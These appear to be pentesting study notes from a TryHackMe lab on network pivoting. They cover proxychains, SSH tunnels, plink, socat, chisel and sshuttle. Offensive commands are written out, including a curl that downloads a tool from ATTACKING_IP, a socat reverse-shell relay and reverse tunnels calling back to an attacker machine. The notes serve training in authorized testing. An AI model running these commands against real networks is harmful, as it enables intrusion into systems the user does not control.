# Pivoting 
![alt text](https://assets.tryhackme.com/additional/wreath-network/6904b85a9b93.png)
## Manual Techniques 
- There are two main methods encompassed in this area of pentesting:
- Tunnelling/Proxying: Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall
- Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host
### Pros and cons
- A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.
- Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.
- It would be sensible at this point to also start to draw up a layout of the network as you see it
- As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux webserver is absolutely ideal.
### Enumeration
- There are five possible ways to enumerate a network through a compromised host:
- Using material found on the machine. The hosts file or ARP cache, for example
- Using pre-installed tools
- Using statically compiled tools
- Using scripting techniques
- Using local tools through a proxy
## Basic Checks
- Win and Lin see the arp cache
````
arp -a 
````
- Static mapping Lin/Win
````
/etc/hosts 
C:\Windows\System32\drivers\etc\hosts 
````
- Local DNS server (zone transfer?)
````
/etc/resolv.conf 
````
- Lin/Win ip address, interfaces, gateway etc
````
ipconfig /all 
ip addr 
````
- Alternative to reading /etc/resolv.conf
````
nmcli dev show 
````
#### Proxy Note:
- Finally, the dreaded scanning through a proxy. This should be an absolute last resort, as scanning through something like proxychains is very slow, and often limited (you cannot scan UDP ports through a TCP proxy, for example). 
- The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. 
- As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy specifically against the found ports.
## LOL Techniques
- The following Bash one-liner would perform a full ping sweep of the `192.168.1.x` network:
````
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
````
- The equivalent of this command in Powershell is unbearably slow, so it's better to find an alternative option where possible.
- If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.
### Port scanning in bash can be done:
````
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
````
## Proxychains and FoxyProxy
- Think of this as being something like a tunnel created between a port on our attacking box that comes out inside the target network
### Proxychains
- Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish.
- Ideally you should try to use static tools where possible
- For example, to proxy netcat  through a proxy, you could use the command:
````
proxychains nc 172.16.0.10 23
````
- `proxychains` reads its options from a config file. The master config file is located at `/etc/proxychains.conf`. 
- This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:
The current directory (i.e. `./proxychains.conf`)
````
~/.proxychains/proxychains.conf
/etc/proxychains.conf
````
-  It's extremely easy to configure proxychains for a specific assignment, without altering the master file. 
-  Simply execute: `cp /etc/proxychains.conf .`, then make any changes to the config file in a copy stored in your current directory. 
-  If you're likely to move directories a lot then you could instead place it in a `.proxychains` directory under your home directory
- If you mess up the master copy, redownload: 
- https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf
- The only section we care about right now is:
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/443c865e3ff3.png)
- By default there is one proxy set to localhost port 9050 -- this is the default port for a Tor entrypoint, should you choose to run one on your attacking machine. 
- That said, it is not hugely useful to us. This should be changed to whichever (arbitrary) port is being used for the proxies
- There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png)
- If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the `proxy_dns` line
#### Other things to note when scanning through proxychains:
- You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the  -Pn  switch to prevent Nmap from trying it.
- It will be extremely slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library).
#### Examples
- Line addition to `proxychains.conf` to redirect through sock4 proxy
````
socks4 127.0.0.1 4242
````
- Telnet through a proxy to target
````
proxychains telnet 172.16.0.100 23
````
### FoxyProxy
- Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/c22f2ef3d6fc.png)
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/92e3cabe22e8.png)
- Fill in the IP and Port on the right hand side of the page that appears, then give it a name. Set the proxy type to the kind of proxy you will be using. SOCKS4 is usually a good bet, although Chisel requires SOCKS5. An example config is given here:
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/19436164d15e.png)
- Press Save, then click on the icon in the task bar again to bring up the proxy menu. You can switch between any of your saved proxies by clicking on them:
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/1d91c2b6a625.png)
- Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). 
- Be aware that if the target network doesn't have internet access then you will not be able to access the outside internet when the proxy is activated. 
- Even in a real engagement, routing your general internet searches through a client's network is unwise
## SSH Tunnelling and Port Forwarding
### Forward Connections
- Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target.
- There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.
- Port forwarding is accomplished with the `-L` switch, which creates a link to a Local port. For example, if we had SSH access to `172.16.0.5` and there's a webserver running on `172.16.0.10`, we could use this command to create a link to the server on `172.16.0.10`:
````
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
````
- We could then access the website on `172.16.0.10` (through `172.16.0.5`) by navigating to port `8000` on our own attacking machine. 
- For example, by entering `localhost:8000` into a web browser. 
- Using this technique we have effectively created a tunnel between port `80` on the target server, and port `8000` on our own box. Note that it's good practice to use a high port, out of the way, for the local connection.
- This also means that we do not need to use `sudo` to create the connection. The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.
###Proxies 
- These are made using the `-D` switch, for example: `-D 1337`. This will open up port `1337` on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as `proxychains`. 
- An example of this command would be:
````
ssh -D 1337 user@172.16.0.5 -fN
````
This again uses the `-fN` switches to background the shell. The choice of port `1337` is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.
### Reverse Connections
- Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). 
- They are, however, riskier as you inherently must access your attacking machine from the target
#### Make it safe
- First, generate a new set of SSH keys and store them somewhere safe `ssh-keygen`
- Copy the contents of the public key (the file ending with .pub), then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh directory and authorized_keys file first.
- On a new line, type the following line, then paste in the public key:
````
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
````
- This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
- The final entry in the authorized_keys file should look something like this:
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/055753470a05.png)
- Next. check if the SSH server on your attacking machine is running:
````
sudo systemctl status ssh
````
- The only thing left is to do the unthinkable: transfer the private key to the target box. 
- With the key transferred, we can then connect back with a reverse port forward using the following command:
````
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
````
- To put that into the context of our fictitious IPs: `172.16.0.10` and `172.16.0.5`, if we have a shell on `172.16.0.5` and want to give our attacking box (`172.16.0.20`) access to the webserver on `172.16.0.10`, we could use this command on the `172.16.0.5` machine:
````
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN
````
- This would open up a port forward to our Kali box, allowing us to access the `172.16.0.10` webserver, in exactly the same way as with the forward connection we made before!
#### Note
- In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). 
- This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
````
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
````
- To close any of these connections, type ps aux | grep ssh into the terminal of the machine that created the connection:
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/daf8fd5c8540.png)
- Find the process ID (PID) of the connection. In the above image this is 105238.
- Finally, type sudo kill PID to close the connection:
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/dc4393e7991e.png)
#### Examples
- If you wanted to set up a reverse portforward from port `22` of a remote machine (`172.16.0.100`) to port `2222` of your local machine (`172.16.0.200`), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (Assume your username is "kali")
````
ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN
````
- What command would you use to set up a forward proxy on port `8000` to `user@target.thm`, backgrounding the shell?
````
ssh -D 8000 user@target.thm -fN
````
- If you had SSH access to a server (`172.16.0.50`) with a webserver running internally on port `80` (i.e. only accessible to the server itself on `127.0.0.1:80`), how would you forward it to port `8000` on your attacking machine? Assume the username is `user`, and background the shell.
````
ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN
````
## Plink.exe
-  Is a Windows command line version of the PuTTY SSH client
- Our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. 
- This would be done with the following command:
````
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
````
- To use our example from before, if we have access to `172.16.0.5` and would like to forward a connection to `172.16.0.10:80` back to port `8000` our own attacking machine (`172.16.0.20`), we could use this command:
````
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
````
- Note that any keys generated by ssh-keygen will not work properly here. 
- You will need to convert them using the `puttygen` tool, which can be installed on Kali using `sudo apt install putty-tools`. After downloading the tool, conversion can be done with:
````
puttygen KEYFILE -o OUTPUT_KEY.ppk
````
#### Note plink.exe 
- Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the .exe. Whilst there is a copy pre-installed on Kali at `/usr/share/windows-resources/binaries/plink.exe`
- Download the latest
- https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
## Socat
- Socat is not just great for fully stable Linux shells, it's also superb for port forwarding.
- That said, static binaries are easy to find for both Linux and Windows. 
- The Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required.
-  `socat` makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. 
- This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png)
- Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.
- For example, with a Python webserver:-
- On Kali (inside the directory containing your Socat binary):
````
sudo python3 -m http.server 80
````
- Then, on the target:
````
curl ATTACKING_IP/socat -o /tmp/socat && chmod +x /tmp/socat
````
### Reverse Shell Relay
- Let's start a standard netcat listener on our attacking box (`sudo nc -lvnp 443`). Next, on the compromised server, use the following command to start the relay:
````
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
````
- From here we can then create a reverse shell to the newly opened port 8000 on the compromised server.
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png)
- A brief explanation of the above command:
- `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port `8000` of the target machine.
- `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. 
- `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.
- The relay connects back to a listener started using an alias to a standard netcat listener: `sudo nc -lvnp 443`.
### Port Forwarding -- Easy
- The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. 
- For example, if the compromised server is `172.16.0.5` and the target is port `3306` of `172.16.0.10`, we could use the following command (on the compromised server) to create a port forward:
````
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
````
This opens up port `33060` on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of `172.16.0.10`. 
- The `fork` option is used to put every connection into a new process, and the `reuseaddr` option means that the port stays open after a connection is made to it.
- We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.
### Port Forwarding -- Quiet
- This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.
- First of all, on our own attacking machine, we issue the following command:
````
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
````
- This opens up two ports: `8000` and `8001`, creating a local port relay. What goes into one of them will come out of the other. For this reason, port `8000` also has the `fork` and `reuseaddr` options set, to allow us to create more than one connection using this port forward.
- Next, on the compromised relay server (`172.16.0.5` in the previous example) we execute this command:
````
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
````
This makes a connection between our listening port `8001` on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
````
./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
````
This would create a link between port `8000` on our attacking machine, and port `80` on the intended target (`172.16.0.10`), meaning that we could go to `localhost:8000` in our attacking machine's web browser to load the webpage served by the target: `172.16.0.10:80`!
#### Killing Jobs
 - Run the `jobs` command in your terminal, then kill any `socat` processes using `kill %NUMBER`
 ## Chisel
 - Is used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It's written in Golang and can be easily compiled for any system.
 - https://github.com/jpillora/chisel/releases
 - The chisel binary has two modes: client and server. You can access the help menus for either with the command: `chisel client|server --help`
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/9435cdc6e54d.png)
### Chisel Reverse SOCKS Proxy:
- This connects back from a compromised server to a listener waiting on our attacking machine.
- On our own attacking box we would use a command that looks something like this:
````
./chisel server -p LISTEN_PORT --reverse &
````
- ![alt text](https://assets.tryhackme.com/additional/wreath-network/a27fb82676b4.png)
- Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on 127.0.0.1:1080. 
- As such, we will be using port 1080 when sending data through the proxy.
### Forward SOCKS Proxy:
- In many ways the syntax for this is simply reversed from a reverse proxy.
- First, on the compromised host we would use:
````
./chisel server -p LISTEN_PORT --socks5
````
- On our own attacking box we would then use:
````
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
````
- In this command, PROXY_PORT is the port that will be opened for the proxy.
- For example, `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port `8080` of `172.16.0.10`. 
- A SOCKS proxy would be opened on port `1337` of our attacking machine.
#### Proxychains Reminder:
- When sending data through either of these proxies, we would need to set the port in our proxychains configuration. 
- As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from socks4 to socks5:
````
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5  127.0.0.1 1080
````
### Chisel Remote Port Forward:
- A remote port forward is when we connect back from a compromised target to create the forward.
- For a remote port forward, on our attacking machine we use the exact same command as before:
````
./chisel server -p LISTEN_PORT --reverse &
````
- Once again this sets up a chisel listener for the compromised host to connect back to.
- The command to connect back is slightly different this time, however:
````
./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
````
- Let's assume that our own IP is `172.16.0.20`, the compromised server's IP is `172.16.0.5`, and our target is port `22` on `172.16.0.10`. The syntax for forwarding `172.16.0.10:22` back to port `2222` on our attacking machine would be as follows:
````
./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
````
- Connecting back to our attacking machine, functioning as a chisel server started with:
````
./chisel server -p 1337 --reverse &
````
- This would allow us to access `172.16.0.10:22` (via SSH) by navigating to `127.0.0.1:2222`.
### Chisel Local Port Forward:
- As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.
- On the compromised target we set up a chisel server:
````
./chisel server -p LISTEN_PORT
````
- We now connect to this from our attacking machine like so:
````
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
````
- For example, to connect to `172.16.0.5:8000` (the compromised host running a chisel server), forwarding our local port `2222` to `172.16.0.10:22` (our intended target), we could use:
````
./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
````
## SShuttle
- It doesn't perform a port forward, and the proxy it creates is nothing like the ones we have already seen. 
- Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. 
- It simulates a VPN, allowing us to route our traffic through the proxy without the use of proxychains (or an equivalent). 
- We can just directly connect to devices in the target network as we would normally connect to networked devices. As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted.
### Limitations
- sshuttle only works on Linux targets. 
- It also requires access to the compromised server via SSH, and Python also needs to be installed on the server. 
- That said, with SSH access, it could theoretically be possible to upload a static copy of Python and work with that.
````
sudo apt install sshuttle
````
- The base command for connecting to a server with sshuttle is as follows:
````
sshuttle -r username@address subnet 
````
- For example, in our fictional `172.16.0.x` network with a compromised server at `172.16.0.5`, the command may look something like this:
````
sshuttle -r user@172.16.0.5 172.16.0.0/24
````
- We would then be asked for the user's password, and the proxy would be established. 
- The tool will then just sit passively in the background and forward relevant traffic into the target network.
- Rather than specifying subnets, we could also use the `-N` option which attempts to determine them automatically based on the compromised server's own routing table:
````
sshuttle -r username@address -N
````
- If this has worked, you should see the following line:
````
c : Connected to server.
````
- sshuttle doesn't currently seem to have a shorthand for specifying a private key to authenticate to the server with. That said, we can easily bypass this limitation using
````
--ssh-cmd 
```` 
- With the `--ssh-cmd switch`, we can pick a different command to execute for authentication: say, `ssh -i keyfile`
#### Final Command
- So, when using key-based authentication, the final command looks something like this:
````
sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
````
- To use our example from before, the command would be:
````
sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
````
#### Errors
- Please Note: When using sshuttle, you may encounter an error that looks like this:
````
client: Connected.
client_loop: send disconnect: Broken pipe
client: fatal: server died with error code 255
````
- This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. 
- For instance, if we were connecting to `172.16.0.5` and trying to forward `172.16.0.0/24`, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die.
- To get around this, we tell sshuttle to exclude the compromised server from the subnet range using the `-x` switch.
- To use our earlier example:
````
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
````

































- All credit for this guide goes to:
- https://tryhackme.com/room/wreath

